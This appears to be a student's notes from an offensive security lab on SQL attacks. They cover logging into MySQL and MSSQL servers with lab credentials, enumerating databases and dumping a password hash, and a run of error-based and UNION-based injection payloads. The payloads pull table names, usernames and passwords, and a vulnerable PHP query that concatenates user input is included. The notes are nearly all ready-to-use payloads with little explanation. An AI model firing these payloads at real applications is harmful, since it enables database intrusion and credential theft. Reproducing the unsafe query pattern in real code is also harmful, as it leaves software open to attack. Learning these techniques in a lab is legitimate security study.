
```bash
# connect to a remote sql database
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

```sql
# look for version
MySQL [(none)]> select version();
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.107 sec)
```

```sql
# look system user
# database-specific root user, not the the system-wide administrative root user

MySQL [(none)]> select system_user();
+--------------------+
| system_user()      |
+--------------------+git 
| root@192.168.20.50 |
+--------------------+
1 row in set (0.104 sec)
```

```sql
# display the databases
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

```sql
# reterive password
MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+--------+---------------------------------------------------------------------+
| user   | authentication_string                                               |
+--------+---------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6      |
+--------+---------------------------------------------------------------------+
1 row in set (0.106 sec)
```

### MSSQL
```bash
# use impacket
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

SQL> SELECT @@version;
SQL> SELECT name FROM sys.databases;
SQL> SELECT * FROM offsec.information_schema.tables;
SQL> select * from offsec.dbo.users;

```

## Error based
```bash
# testing for sql injection bypass
offsec' OR 1=1 -- //
```

```bash
# Injected Sql statement
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

```bash
# error based payload
' or 1=1 in (select @@version) -- //
```
**MySQL accepts both _version()_ and _@@version_ statements.**

```bash
# attampt to retrieve user table
' OR 1=1 in (SELECT * FROM users) -- //
```

```bash
# attampt to retrieve password from user table
' or 1=1 in (SELECT password FROM users) -- //
```

```bash
# improving SQLi error-based payload
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## UNION-based

```php
# VULNERABLE CODE BLOCK
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

```sql
# Verifying the exact number of columns
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
' ORDER BY 69-- //
```

```sql
# Enumerating the Database via SQL UNION Injection
%' UNION SELECT database(), user(), @@version, null, null-- //
```

```sql
# fixing the injected UNION query if the frontend dont show all columns
' UNION SELECT null, null, database(), user(), @@version -- //
```

```sql
# Retrieving Current Database Tables and Columns
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

```sql
# Retrieve user data
' UNION SELECT null, username, password, description, null FROM users -- //
```

```sql
# from lab inside post request body, confirming the version
mail-list=email.com' UNION SELECT @@version, @@version, @@version, @@version, @@version, @@version-- //
```


